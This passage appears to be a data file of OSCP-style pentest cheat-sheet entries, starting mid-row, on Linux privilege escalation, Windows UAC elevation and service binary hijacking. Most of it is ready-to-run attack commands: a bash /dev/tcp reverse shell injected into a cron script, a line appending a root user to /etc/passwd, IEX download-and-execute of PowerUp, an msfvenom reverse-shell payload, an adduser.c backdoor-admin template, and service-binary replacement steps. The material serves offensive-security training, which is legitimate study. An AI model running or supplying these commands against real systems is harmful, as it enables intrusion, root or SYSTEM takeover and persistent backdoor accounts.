$c.Close(); Remove-Item C:\\ntds.dit,C:\\system.bak,C:\\loot.zip -Force"", ""shows"": ""Shadow copy set succesfully created (vshadow output)""}]}]"
"linux-privesc-oneliners","Linux Privilege Escalation One-Liners","Essential Linux privesc one-liners for rapid OSCP enumeration and exploitation. All commands use standard Linux utilities - no tool uploads required.","ONE_LINER|OSCP:HIGH|LINUX|PRIVILEGE_ESCALATION|SUID|CRON|GTFOBINS|QUICK_REFERENCE","{""how_to_recognize"": [""You have a low-privilege shell on a Linux target"", ""Need to escalate to root quickly using manual techniques"", ""Restricted environment where uploading linpeas/linenum is impractical"", ""Time-sensitive situation requiring immediate enumeration""], ""when_to_look_for"": [""Immediately after obtaining initial shell access"", ""When automated enumeration scripts are blocked or unavailable"", ""During OSCP exam when every second counts"", ""When pivoting through multiple Linux systems rapidly""]}","[{""title"": ""Scenario: Linux Privilege Escalation from Low-Priv Shell"", ""context"": ""You have obtained a low-privilege shell on a Linux target (web shell, reverse shell, SSH as low-priv user). Need to escalate to root quickly using manual techniques suitable for OSCP exam."", ""approach"": ""Phase 1: Quick Enumeration (30 seconds)\n- Run linux-quick-privesc-enum to check SUID, SGID, capabilities\n- Note any non-standard binaries or dangerous capabilities\n\nPhase 2: Check Quick Wins (30 seconds)\n- Test writable /etc/passwd: [ -w /etc/passwd ] && echo 'VULNERABLE'\n- If vulnerable, use linux-passwd-privesc for instant root\n- Check sudo -l for NOPASSWD entries\n\nPhase 3: SUID Exploitation (1-2 minutes)\n- Use linux-gtfobins-suid-filter to identify exploitable binaries\n- Cross-reference with GTFOBins website\n- Execute exploitation technique (e.g., find -exec /bin/bash -p)\n\nPhase 4: Cron/Scheduled Tasks (1 minute)\n- Use linux-cron-enum to view scheduled jobs\n- Look for writable scripts or PATH hijacking opportunities\n\nPhase 5: Flag Capture\n- Use linux-flag-finder to locate proof.txt\n- Screenshot id output with flag content"", ""commands"": [""linux-quick-privesc-enum"", ""linux-passwd-privesc"", ""linux-gtfobins-suid-filter"", ""linux-cron-enum"", ""linux-flag-finder""], ""expected_outcome"": ""Root access within 5 minutes using manual techniques. Methodology follows standard OSCP privesc workflow with documented evidence for reporting."", ""why_this_works"": ""Systematic approach covers most common Linux privesc vectors in order of reliability and speed. SUID and writable passwd are the most reliable quick wins, followed by sudo misconfigurations and cron job exploitation.""}]","[{""title"": ""Linux Privilege Escalation - One-Liners"", ""notes"": ""Essential Linux privesc one-liners for rapid OSCP enumeration and exploitation.\n\nEXECUTION ORDER (recommended):\n1. Quick enum (SUID/SGID/capabilities) - First thing after shell\n2. Check writable /etc/passwd - Instant win if vulnerable\n3. Filter for GTFOBins exploitable binaries - Focus research\n4. Enumerate cron jobs - Look for writable scripts\n5. Research remaining SUID with searchsploit\n\nOSCP EXAM RELEVANCE: HIGH\n- All techniques are manual and exam-allowed\n- No tools required beyond standard Linux utilities\n- Quick execution (most under 30 seconds)\n\nCOMMON QUICK WINS:\n- Writable /etc/passwd: Add root user instantly\n- SUID find/vim/python: GTFOBins exploitation\n- Writable cron script: Inject reverse shell\n- Dangerous capabilities: cap_setuid on any interpreter"", ""commands"": [{""id"": ""linux-flag-finder"", ""example"": ""result=$(find / -type f -regex \"".*\\(flag\\|proof\\)\\.txt\"" 2>/dev/null); [ -n \""$result\"" ] && echo \""$result\"" || grep -rlE \""OS\\{[a-fA-F0-9]{32}\\}\"" / 2>/dev/null"", ""shows"": ""Path to flag.txt or proof.txt displayed""}, {""id"": ""linux-passwd-privesc"", ""example"": ""U=\""root2\"" P=\""w00t\""; [ -w /etc/passwd ] && ! grep -q \""^$U:\"" /etc/passwd && echo \""$U:$(openssl passwd $P):0:0:root:/root:/bin/bash\"" >> /etc/passwd && su $U"", ""shows"": ""No error from echo command""}, {""id"": ""linux-quick-privesc-enum"", ""example"": ""echo \""=== SUID ===\"" && find / -perm -4000 -type f 2>/dev/null && echo -e \""\\n=== SGID ===\"" && find / -perm -2000 -type f 2>/dev/null && echo -e \""\\n=== CAPABILITIES ===\"" && getcap -r / 2>/dev/null"", ""shows"": ""List of SUID binaries displayed""}, {""id"": ""linux-full-privesc-check"", ""example"": ""echo \""[*] SUID binaries owned by root:\"" && find / -perm -4000 -user root -type f 2>/dev/null && echo -e \""\\n[*] Capabilities:\"" && getcap -r / 2>/dev/null && echo -e \""\\n[*] Writable /etc/passwd?\"" && [ -w /etc/passwd ] && echo \""YES - VULNERABLE\"" || echo \""No\"" && echo -e \""\\n[*] Sudo permissions:\"" && sudo -l 2>/dev/null"", ""shows"": ""Complete output for all sections""}, {""id"": ""linux-gtfobins-suid-filter"", ""example"": ""GTFO=\""find|vim|nmap|python|perl|ruby|bash|less|more|cp|mv|tar|awk|env|ftp|git|docker|php|node|lua\""; find / -perm -4000 -type f 2>/dev/null | grep -E \""($GTFO)\"""", ""shows"": ""One or more known exploitable binaries found""}, {""id"": ""linux-suid-auto-research"", ""example"": ""for bin in $(find / -perm -4000 -type f 2>/dev/null | xargs -I {} basename {}); do echo \""=== $bin ===\""; searchsploit $bin 2>/dev/null | head -5; done"", ""shows"": ""Exploit entries found for binaries""}, {""id"": ""linux-cron-enum"", ""example"": ""cat /etc/crontab; ls -la /etc/cron.*; cat /var/spool/cron/crontabs/* 2>/dev/null"", ""shows"": ""Crontab contents displayed""}, {""id"": ""linux-suid-vuln-check"", ""example"": ""ls -la $(which find) | grep -q 'rws' && echo \""VULNERABLE\"" || echo \""NOT VULNERABLE\"""", ""shows"": ""VULNERABLE output""}, {""id"": ""linux-cron-hijack-suid"", ""example"": ""echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /var/archives/archive.sh && sleep 65 && /tmp/rootbash -p"", ""shows"": ""No error from echo command""}, {""id"": ""linux-cron-hijack-revshell"", ""example"": ""echo 'bash -i >& /dev/tcp/192.168.45.204/4444 0>&1' >> /opt/scripts/backup.sh"", ""shows"": ""Reverse shell connects as root""}, {""id"": ""linux-suid-find-shell"", ""example"": ""find / -exec /bin/bash -p \\; -quit"", ""shows"": ""Shell prompt changes to # or bash-5.0#""}]}]"
"windows-uac-elevation","Windows UAC Elevation One-Liners","One-liner commands for launching elevated PowerShell sessions via Start-Process -Verb RunAs. Requires GUI access (RDP/physical console).","ONE_LINER|OSCP:LOW|WINDOWS|POWERSHELL|UAC|ELEVATION|PRIVILEGE_ESCALATION|RDP|QUICK_REFERENCE","{""how_to_recognize"": [""You have RDP or physical console access to Windows target"", ""User is in local Administrators group but running Medium integrity"", ""Need to test UAC configuration before attempting bypass techniques"", ""Interactive GUI session available for manual UAC prompt approval""], ""when_to_look_for"": [""Internal penetration testing with RDP access"", ""Testing UAC configuration behavior on target systems"", ""Social engineering scenarios where user can approve UAC prompt"", ""Lab environments where interactive access is available""]}","[{""title"": ""Scenario: Quick PowerShell Elevation Test (RDP Access)"", ""context"": ""You have RDP access to a Windows target as a user who is in the local Administrators group. You need to quickly test if you can elevate to High integrity without using UAC bypass techniques. You want to verify the UAC prompt behavior before attempting automation."", ""approach"": ""Phase 1: Verify User Context (30 seconds)\n- Check if user in Administrators group: net localgroup administrators\n- Check current integrity level: whoami /groups | findstr 'Mandatory'\n- Verify UAC enabled: reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA\n\nPhase 2: Test Manual Elevation (1 minute)\n- Use powershell-runas-basic to open elevated shell\n- User clicks 'Yes' on UAC prompt (if appears)\n- Verify High integrity in new window\n\nPhase 3: Determine Next Steps (30 seconds)\n- If UAC prompt appeared and worked -> User can manually elevate\n- If no prompt (UAC disabled) -> User already has full admin rights\n- If prompt but denied -> Need UAC bypass technique instead"", ""commands"": [""powershell-runas-basic"", ""powershell-runas-keepopen""], ""expected_outcome"": ""Understand UAC configuration and user privilege context in 2 minutes. Determine if automated UAC bypass needed or if manual elevation sufficient for current engagement."", ""why_this_works"": ""Manual UAC elevation reveals system configuration (UAC enabled/disabled, user admin status, consent vs credential prompt behavior) which informs automation strategy. Quick test before committing to complex bypass techniques.""}, {""title"": ""Scenario: Output Capture from Elevated Command (RDP)"", ""context"": ""You have RDP access and need to run a privileged command (like reading protected registry keys or accessing ADMIN$ share) but want to capture the output for documentation or further analysis without keeping an elevated window open."", ""approach"": ""Phase 1: Prepare Output Location (30 seconds)\n- Create temp directory if needed: mkdir C:\\temp\n- Verify write permissions: echo test > C:\\temp\\test.txt\n- Delete test file: del C:\\temp\\test.txt\n\nPhase 2: Execute Elevated Command with Redirect (1 minute)\n- Use powershell-runas-output-redirect with desired command\n- User clicks 'Yes' on UAC prompt\n- Wait for elevated window to flash and close\n\nPhase 3: Retrieve and Analyze Output (30 seconds)\n- Read output file: type C:\\temp\\output.txt\n- Analyze results in current shell\n- Clean up: del C:\\temp\\output.txt"", ""commands"": [""powershell-runas-output-redirect""], ""expected_outcome"": ""Capture output from elevated command in current non-elevated shell in 2 minutes. Useful for one-off administrative queries without maintaining persistent elevated access."", ""why_this_works"": ""Output redirection to file bridges integrity level gap. Elevated process writes to file accessible by both Medium and High integrity processes. Current shell can read file after elevated process completes.""}, {""title"": ""Scenario: Remote Script Execution with Elevation (RDP + Enumeration)"", ""context"": ""You have RDP access to Windows target. Need to run enumeration tool (PowerUp.ps1, PowerView.ps1) with elevation but script is hosted on your attack machine. Want fileless execution without transferring script to disk."", ""approach"": ""Phase 1: Setup Web Server (Attacker Machine - 1 minute)\n- Navigate to script directory: cd /path/to/scripts\n- Start HTTP server: python3 -m http.server 80\n- Verify script accessible: curl http://localhost/PowerUp.ps1\n\nPhase 2: Execute Elevated Download (Target - 2 minutes)\n- Test connectivity: Test-NetConnection <LHOST> -Port 80\n- Use powershell-runas-download-execute with script URL\n- User clicks 'Yes' on UAC prompt\n- Script downloads and executes in elevated context\n\nPhase 3: Analyze Results (Variable time)\n- Review PowerUp findings in elevated window\n- Document privilege escalation vectors\n- Plan exploitation based on results"", ""commands"": [""powershell-runas-download-execute""], ""expected_outcome"": ""Fileless execution of enumeration script with elevation in 3-4 minutes. No disk artifacts on target. Results displayed in elevated window for immediate analysis."", ""why_this_works"": ""Combines UAC elevation + remote download + in-memory execution. IEX executes script content without writing to disk. Elevated context allows privileged enumeration (service configs, registry keys, scheduled tasks).""}]","[{""title"": ""Windows PowerShell - Manual UAC Elevation"", ""notes"": ""One-liner commands for launching elevated PowerShell sessions via Start-Process -Verb RunAs.\n\nIMPORTANT LIMITATIONS:\n- Requires GUI access (RDP, physical console)\n- User must click UAC prompt manually\n- NOT suitable for reverse shells or automated exploitation\n- OSCP exam relevance: LOW (no GUI interaction possible)\n\nWHEN TO USE:\n- Internal penetration testing with RDP access\n- Testing UAC configuration behavior\n- Legitimate administrative tasks on controlled systems\n- Social engineering scenarios (convince user to approve)\n\nWHEN NOT TO USE (OSCP EXAM):\n- Reverse shells from web exploits\n- WinRM/SSH remote sessions (non-interactive)\n- Automated exploitation requiring no user interaction\n- Any scenario requiring stealth (UAC prompts are visible)\n\nBETTER ALTERNATIVES FOR OSCP:\n- UAC bypass techniques (fodhelper, eventvwr) - No prompt required\n- Service exploitation - Escalate without user interaction\n- Token impersonation (Potato exploits) - If SeImpersonate available\n- Credential reuse (runas /savecred) - If admin credentials cached"", ""commands"": [{""id"": ""powershell-runas-basic"", ""example"": ""powershell -Command \""Start-Process powershell -Verb RunAs\"""", ""shows"": ""UAC prompt appears asking for admin consent""}, {""id"": ""powershell-runas-output-redirect"", ""example"": ""powershell -Command \""Start-Process powershell -Verb RunAs -ArgumentList '-Command','Get-Process > C:\\temp\\output.txt'\"""", ""shows"": ""UAC prompt appears and user clicks 'Yes'""}, {""id"": ""powershell-runas-keepopen"", ""example"": ""powershell -Command \""Start-Process powershell -Verb RunAs -ArgumentList '-NoExit','-Command','cd C:\\\\'\"""", ""shows"": ""UAC prompt appears and user clicks 'Yes'""}, {""id"": ""powershell-runas-download-execute"", ""example"": ""powershell -Command \""Start-Process powershell -Verb RunAs -ArgumentList '-NoExit','-Command','IEX(New-Object Net.WebClient).DownloadString(\\\""http://10.10.14.5/PowerUp.ps1\\\"")\\\""'\"""", ""shows"": ""UAC prompt appears (user must click 'Yes')""}]}]"
"windows-service-binary-hijacking","Windows Service Binary Hijacking Privilege Escalation","Complete methodology for exploiting writable Windows service binaries to escalate privileges to SYSTEM. When administrators install third-party software (XAMPP, custom applications), they often grant overly permissive write access to service binaries. If a low-privilege user can replace the service binary with a malicious payload, the payload executes with the service's privileges (typically LocalSystem/SYSTEM) when the service restarts. This technique requires: (1) Finding a service with a writable binary, (2) Creating a malicious payload, (3) Replacing the binary, and (4) Triggering service restart via direct command or system reboot. PowerUp.ps1 can automate detection but has known bugs with complex service paths - always verify manually.","WINDOWS|PRIVILEGE_ESCALATION|SERVICE_HIJACKING|BINARY_HIJACKING|OSCP:HIGH|POST_EXPLOITATION|POWERUP|MINGW|CROSS_COMPILE|ICACLS|PERMISSIONS|LOCALSYSTEM","{""how_to_recognize"": [""Service binary paths outside C:\\Windows\\System32 (e.g., C:\\xampp, C:\\Program Files\\CustomApp)"", ""icacls shows BUILTIN\\Users:(F) or (M) or (W) on service executable"", ""Third-party or user-installed software services (MySQL, Apache, custom apps)"", ""PowerUp Get-ModifiableServiceFile returns vulnerable services"", ""Non-inherited (no 'I' prefix) Full/Modify permissions for low-privilege groups""], ""when_to_look_for"": [""Initial privilege escalation enumeration after gaining low-privilege shell"", ""Target has XAMPP, WAMP, or similar development stacks installed"", ""Custom enterprise software with services installed outside Windows directories"", ""When automated tools (WinPEAS, PowerUp) flag service misconfigurations"", ""Standard user needs path to SYSTEM without exploiting kernel vulnerabilities""], ""key_concepts"": [""Windows services run as specific accounts (LocalSystem = SYSTEM privileges)"", ""Service binaries execute with service account privileges, not user privileges"", ""Auto-start services execute binaries on system boot - no service restart needed"", ""Permission mask: F=Full, M=Modify, RX=Read/Execute, R=Read, W=Write"", ""Only need Write (W) or higher to replace binary""]}","[{""title"": ""Scenario 1: Basic Service Binary Hijacking (XAMPP MySQL)"", ""context"": ""You have RDP access as user 'dave' on a Windows workstation with XAMPP installed. You need SYSTEM privileges to access admin desktop files. WinPEAS or initial enumeration identified the mysql service running from C:\\xampp\\mysql\\bin\\mysqld.exe."", ""approach"": ""Phase 1: Service Enumeration (2 minutes)\n- List running services with paths: Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}\n- Identify non-Windows paths (C:\\xampp, C:\\Program Files\\CustomApp)\n- Note the mysql service at C:\\xampp\\mysql\\bin\\mysqld.exe\n\nPhase 2: Permission Analysis (1 minute)\n- Check binary permissions: icacls \""C:\\xampp\\mysql\\bin\\mysqld.exe\""\n- Look for: BUILTIN\\Users:(F) - Full access for all users\n- Verify it's NOT just (RX) which is read/execute only\n\nPhase 3: Startup Type Check (30 seconds)\n- Verify auto-start: Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}\n- Confirm StartMode is 'Auto' (will start on reboot)\n\nPhase 4: Create Payload (2 minutes on Kali)\n- Write adduser.c with net user/localgroup commands\n- Cross-compile: x86_64-w64-mingw32-gcc adduser.c -o adduser.exe\n- Start web server: python3 -m http.server 80\n\nPhase 5: Transfer and Replace (2 minutes)\n- Download payload: iwr -uri http://<LHOST>/adduser.exe -Outfile adduser.exe\n- Backup original: move C:\\xampp\\mysql\\bin\\mysqld.exe C:\\Users\\dave\\mysqld.exe.bak\n- Replace binary: move .\\adduser.exe C:\\xampp\\mysql\\bin\\mysqld.exe\n\nPhase 6: Trigger and Verify (3 minutes)\n- Try service restart: net stop mysql (expect 'Access denied')\n- Check shutdown privilege: whoami /priv (look for SeShutdownPrivilege)\n- Reboot system: shutdown /r /t 0\n- After reboot, verify: Get-LocalGroupMember administrators"", ""commands"": [""win-service-binary-enum-running"", ""win-icacls-binary-check"", ""win-service-startmode-check"", ""win-cross-compile-adduser"", ""win-transfer-iwr"", ""win-service-binary-replace"", ""win-net-stop-service"", ""win-whoami-shutdown-priv"", ""win-shutdown-reboot"", ""win-localgroup-admins-check""], ""expected_outcome"": ""New local administrator user 'dave2' created with password 'password123!'. Can now use runas /user:dave2 cmd followed by Start-Process powershell -Verb RunAs to get elevated shell."", ""why_this_works"": ""The mysql service runs as LocalSystem (SYSTEM privileges). When Windows starts the service, it executes the binary at the configured path with SYSTEM privileges. By replacing the legitimate mysqld.exe with our adduser payload, the system command 'net user' and 'net localgroup' execute as SYSTEM, which has permission to create local administrators.""}, {""title"": ""Scenario 2: Reverse Shell via Service Binary"", ""context"": ""You have a reverse shell on a Windows server and need SYSTEM access. A custom backup service has a writable binary. You prefer getting an immediate SYSTEM shell rather than creating a user account."", ""approach"": ""Phase 1: Identify Vulnerable Service (2 minutes)\n- Enumerate services: Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}\n- Find custom service: BackupService at C:\\BackupTool\\backup.exe\n- Check permissions: icacls \""C:\\BackupTool\\backup.exe\""\n- Confirm Users have (F) or (M)\n\nPhase 2: Generate Reverse Shell Payload (1 minute on Kali)\n- Create payload: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f exe -o backup.exe\n- Verify: file backup.exe\n- Start web server: python3 -m http.server 80\n\nPhase 3: Setup Listener (30 seconds on Kali)\n- Start listener: nc -lvnp 4444\n\nPhase 4: Replace and Trigger (3 minutes)\n- Transfer payload: certutil -urlcache -f http://<LHOST>/backup.exe C:\\temp\\backup.exe\n- Backup original: copy C:\\BackupTool\\backup.exe C:\\BackupTool\\backup.exe.bak\n- Replace: copy C:\\temp\\backup.exe C:\\BackupTool\\backup.exe /Y\n- Verify startup type is Auto, then reboot: shutdown /r /t 0\n\nPhase 5: Receive SYSTEM Shell\n- Wait for callback on listener after reboot\n- Verify: whoami should show 'nt authority\\system'"", ""commands"": [""win-service-binary-enum-running"", ""win-icacls-binary-check"", ""win-msfvenom-service-exe"", ""win-transfer-iwr"", ""win-service-binary-replace"", ""win-shutdown-reboot""], ""expected_outcome"": ""Reverse shell callback received with SYSTEM privileges after system reboot. Full access to all files, registry, and ability to dump credentials."", ""why_this_works"": ""Service executes the binary with its configured account privileges. The reverse shell payload connects back to attacker before the service controller expects a proper response. While the service may 'fail to start' from Windows' perspective, the reverse shell connection is already established with SYSTEM privileges.""}, {""title"": ""Scenario 3: PowerUp Automated Detection and Exploitation"", ""context"": ""You want to quickly check for service binary hijacking opportunities using automation. Target has PowerShell and no application whitelisting."", ""approach"": ""Phase 1: Transfer and Load PowerUp (2 minutes)\n- Start web server on Kali: python3 -m http.server 80\n- On target: powershell -ep bypass\n- Download and load: IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/PowerUp.ps1')\n\nPhase 2: Run Automated Check (30 seconds)\n- Execute: Get-ModifiableServiceFile\n- Review output for:\n  - ServiceName: Name of vulnerable service\n  - ModifiableFile: Path to writable binary\n  - ModifiableFilePermissions: Specific permissions\n  - StartName: LocalSystem means SYSTEM privileges\n  - CanRestart: Whether you can restart service\n  - AbuseFunction: Suggested exploitation command\n\nPhase 3: Attempt Automated Exploitation\n- If simple path: Install-ServiceBinary -Name '<ServiceName>'\n- Creates user john:Password123!\n- Restart service or reboot\n\nPhase 4: Handle PowerUp Failures\n- If Install-ServiceBinary throws error about 'not modifiable':\n  - This is a known bug with paths containing arguments\n  - Fall back to manual exploitation method\n  - Use icacls to verify permissions manually\n  - Proceed with manual binary replacement"", ""commands"": [""win-powerup-modifiable-service"", ""win-powerup-install-service-binary"", ""win-icacls-binary-check"", ""win-service-binary-replace""], ""expected_outcome"": ""Either automated exploitation creates john:Password123! user, or you identify the need for manual exploitation due to PowerUp bug with complex service paths."", ""why_this_works"": ""PowerUp's Get-ModifiableServiceFile queries all services and checks file permissions programmatically. It's faster than manual enumeration but has known limitations with service paths containing arguments. Always verify findings and be prepared for manual exploitation.""}, {""title"": ""Scenario 4: Manual Verification When PowerUp Fails"", ""context"": ""PowerUp's Get-ModifiableServiceFile found a vulnerable service but Install-ServiceBinary fails with 'not modifiable by the current user'. The service path is: C:\\xampp\\mysql\\bin\\mysqld.exe --defaults-file=c:\\xampp\\mysql\\bin\\my.ini mysql"", ""approach"": ""Phase 1: Understand the Bug (1 minute)\n- PowerUp's Install-ServiceBinary uses Get-ModifiablePath internally\n- Get-ModifiablePath fails when PathName contains arguments with paths\n- The '--defaults-file=c:\\xampp\\...' argument confuses the parser\n- This is a known false negative - the binary IS writable\n\nPhase 2: Manual Verification (1 minute)\n- Extract just the binary path: C:\\xampp\\mysql\\bin\\mysqld.exe\n- Check permissions: icacls \""C:\\xampp\\mysql\\bin\\mysqld.exe\""\n- Confirm BUILTIN\\Users:(F) - Full access\n- This proves PowerUp gave false negative\n\nPhase 3: Manual Exploitation (5 minutes)\n- Create payload on Kali: x86_64-w64-mingw32-gcc adduser.c -o adduser.exe\n- Transfer to target: iwr -uri http://<LHOST>/adduser.exe -Outfile adduser.exe\n- Backup original: move C:\\xampp\\mysql\\bin\\mysqld.exe mysqld.exe.bak\n- Replace: move .\\adduser.exe C:\\xampp\\mysql\\bin\\mysqld.exe\n- Check if can restart: net stop mysql (likely 'Access denied')\n- Verify auto-start: sc qc mysql | findstr START_TYPE\n- Reboot: shutdown /r /t 0\n\nPhase 4: Verify Success (1 minute)\n- After reboot: Get-LocalGroupMember administrators\n- Confirm new user dave2 exists"", ""commands"": [""win-powerup-modifiable-service"", ""win-icacls-binary-check"", ""win-cross-compile-adduser"", ""win-transfer-iwr"", ""win-service-binary-replace"", ""win-shutdown-reboot"", ""win-localgroup-admins-check""], ""expected_outcome"": ""Manual exploitation succeeds where PowerUp automation failed. New admin user created. Lesson: Never blindly trust automated tools - always verify manually."", ""why_this_works"": ""PowerUp's Install-ServiceBinary has a parsing bug that causes false negatives when service PathName contains arguments with paths. The underlying vulnerability is real - the binary file IS writable. Manual exploitation bypasses the buggy parsing logic and directly replaces the file.""}, {""title"": ""Scenario 5: Service Binary Hijacking Without Reboot Capability"", ""context"": ""You found a writable service binary but: (1) Cannot restart the service (Access denied), (2) Service is not Auto-start, and (3) User lacks SeShutdownPrivilege. Need alternative approach."", ""approach"": ""Phase 1: Verify the Constraints (2 minutes)\n- Confirm can't restart: net stop <service> shows 'Access is denied'\n- Check startup type: sc qc <service> shows START_TYPE: DEMAND_START (Manual)\n- Check shutdown privilege: whoami /priv - SeShutdownPrivilege not listed\n\nPhase 2: Alternative Strategies\nOption A - Wait for scheduled reboot:\n  - Document finding and wait for IT maintenance window\n  - Replace binary now, exploitation happens on next reboot\n  - Continue with other privesc vectors in meantime\n\nOption B - Find different service:\n  - Look for Auto-start services with writable binaries\n  - Get-CimInstance -ClassName win32_service | Where-Object {$_.StartMode -eq 'Auto'} | Select Name,PathName\n  - Check permissions on each\n\nOption C - Social engineering:\n  - If internal pentest, request 'test reboot' from IT\n  - Document as finding: 'Exploitation requires system reboot'\n\nOption D - Check for other restart triggers:\n  - Service dependencies: sc qc <service> - check DEPENDENCIES\n  - If dependent on restartable service, restart parent\n  - Check scheduled tasks that might restart service\n\nPhase 3: Document and Pivot (1 minute)\n- Add to failed_attempts.md with reasoning\n- Note: 'Binary writable but no restart path - requires scheduled reboot'\n- Move to next privesc vector (DLL hijacking, unquoted paths, etc.)"", ""commands"": [""win-net-stop-service"", ""win-service-startmode-check"", ""win-whoami-shutdown-priv"", ""win-service-binary-enum-running""], ""expected_outcome"": ""Either identify alternative restart method, find different auto-start service, or document as 'requires reboot' and pivot to other techniques."", ""why_this_works"": ""Service binary hijacking requires the service to execute the replaced binary. Without ability to restart service or reboot system, exploitation is delayed until external trigger occurs. In OSCP, always look for auto-start services first to ensure you can complete the attack chain.""}]","[{""title"": ""1. Service Enumeration"", ""notes"": ""First step is identifying services with binaries outside protected Windows directories. Focus on user-installed software (XAMPP, custom apps, third-party tools) which are more likely to have weak permissions.\n\nImportant: Network logons (WinRM, reverse shells) may get 'Access denied' on WMI queries. Use RDP/interactive logon if possible."", ""commands"": [{""id"": ""win-service-binary-enum-running"", ""example"": ""Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}"", ""shows"": ""List of running services with binary paths - focus on non-C:\\Windows paths""}, {""id"": ""win-wmic-service-path"", ""example"": ""wmic service get Name,PathName,StartMode,State"", ""shows"": ""Alternative using WMIC (CMD compatible)""}, {""id"": ""win-sc-query-config"", ""example"": ""sc qc mysql"", ""shows"": ""Detailed service configuration including BINARY_PATH_NAME and SERVICE_START_NAME""}]}, {""title"": ""2. Permission Analysis"", ""notes"": ""Check if current user can write to service binary. Permission mask:\n  F  = Full access (VULNERABLE)\n  M  = Modify access (VULNERABLE)\n  W  = Write-only (VULNERABLE)\n  RX = Read/Execute (NOT vulnerable)\n  R  = Read-only (NOT vulnerable)\n\nLook for: BUILTIN\\Users:(F), Everyone:(M), Authenticated Users:(W)"", ""commands"": [{""id"": ""win-icacls-binary-check"", ""example"": ""icacls \""C:\\xampp\\mysql\\bin\\mysqld.exe\"""", ""shows"": ""Permission list - look for (F), (M), or (W) for low-priv groups""}, {""id"": ""win-get-acl-check"", ""example"": ""Get-Acl \""C:\\xampp\\mysql\\bin\\mysqld.exe\"" | Format-List"", ""shows"": ""PowerShell alternative with detailed access rules""}]}, {""title"": ""3. Payload Creation"", ""notes"": ""Two main approaches:\n1. Adduser payload - Creates local admin user (no network callback needed)\n2. Reverse shell - Immediate SYSTEM shell (requires network connectivity)\n\nAdduser.c template:\n```c\n#include <stdlib.h>\nint main() {\n  int i;\n  i = system(\""net user dave2 password123! /add\"");\n  i = system(\""net localgroup administrators dave2 /add\"");\n  return 0;\n}\n```"", ""commands"": [{""id"": ""win-cross-compile-adduser"", ""example"": ""x86_64-w64-mingw32-gcc adduser.c -o adduser.exe"", ""shows"": ""64-bit Windows executable created (use i686-w64-mingw32-gcc for 32-bit)""}, {""id"": ""win-msfvenom-service-exe"", ""example"": ""msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.5 LPORT=4444 -f exe -o service.exe"", ""shows"": ""Reverse shell payload (start listener before triggering!)""}]}, {""title"": ""4. Binary Replacement"", ""notes"": ""ALWAYS backup the original binary before replacement. This allows restoration after exploitation and helps avoid detection/system issues.\n\nWorkflow: Backup original -> Transfer payload -> Replace binary"", ""commands"": [{""id"": ""win-transfer-iwr"", ""example"": ""iwr -uri http://192.168.45.5/adduser.exe -Outfile C:\\Users\\dave\\adduser.exe"", ""shows"": ""Download payload from attacker's web server""}, {""id"": ""win-service-binary-replace"", ""example"": ""move C:\\xampp\\mysql\\bin\\mysqld.exe C:\\Users\\dave\\mysqld.exe.bak && move C:\\Users\\dave\\adduser.exe C:\\xampp\\mysql\\bin\\mysqld.exe"", ""shows"": ""Atomic backup and replace operation""}]}, {""title"": ""5. Service Restart Methods"", ""notes"": ""To trigger payload execution, service must restart. Three approaches:\n1. Direct restart (requires admin - usually fails)\n2. System reboot (requires SeShutdownPrivilege + Auto-start service)\n3. Wait for external trigger (scheduled reboot, IT maintenance)\n\nAlways check startup type before attempting reboot!"", ""commands"": [{""id"": ""win-net-stop-service"", ""example"": ""net stop mysql"", ""shows"": ""Attempt direct stop (expect 'Access is denied' for low-priv user)""}, {""id"": ""win-service-startmode-check"", ""example"": ""Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}"", ""shows"": ""Check if service is Auto-start (required for reboot method)""}, {""id"": ""win-whoami-shutdown-priv"", ""example"": ""whoami /priv"", ""shows"": ""Look for SeShutdownPrivilege (even if 'Disabled', privilege is available)""}, {""id"": ""win-shutdown-reboot"", ""example"": ""shutdown /r /t 0"", ""shows"": ""Immediate reboot - triggers auto-start services after boot""}]}, {""title"": ""6. Verification"", ""notes"": ""After service restart/reboot, verify exploitation succeeded:\n- Adduser payload: Check local administrators group\n- Reverse shell: Check listener for SYSTEM shell callback\n\nIf verification fails, check Event Viewer for service errors."", ""commands"": [{""id"": ""win-localgroup-admins-check"", ""example"": ""Get-LocalGroupMember administrators"", ""shows"": ""New user (dave2) should appear in list""}, {""id"": ""win-net-localgroup"", ""example"": ""net localgroup administrators"", ""shows"": ""CMD alternative to verify admin group membership""}]}, {""title"": ""7. Automated Detection (PowerUp)"", ""notes"": ""PowerUp.ps1 can automate service binary hijacking detection. However, it has KNOWN BUGS with complex service paths.\n\nKnown Issue: Install-ServiceBinary fails when service PathName contains arguments with paths (e.g., --defaults-file=c:\\path).\n\nAlways verify PowerUp findings manually before exploitation!"", ""commands"": [{""id"": ""win-powerup-import"", ""example"": ""powershell -ep bypass; . .\\PowerUp.ps1"", ""shows"": ""Bypass execution policy and import PowerUp module""}, {""id"": ""win-powerup-modifiable-service"", ""example"": ""Get-ModifiableServiceFile"", ""shows"": ""Automated scan for writable service binaries""}, {""id"": ""win-powerup-install-service-binary"", ""example"": ""Install-ServiceBinary -Name 'mysql'"", ""shows"": ""Automated exploitation (creates john:Password123!) - may fail on complex paths""}]}]"
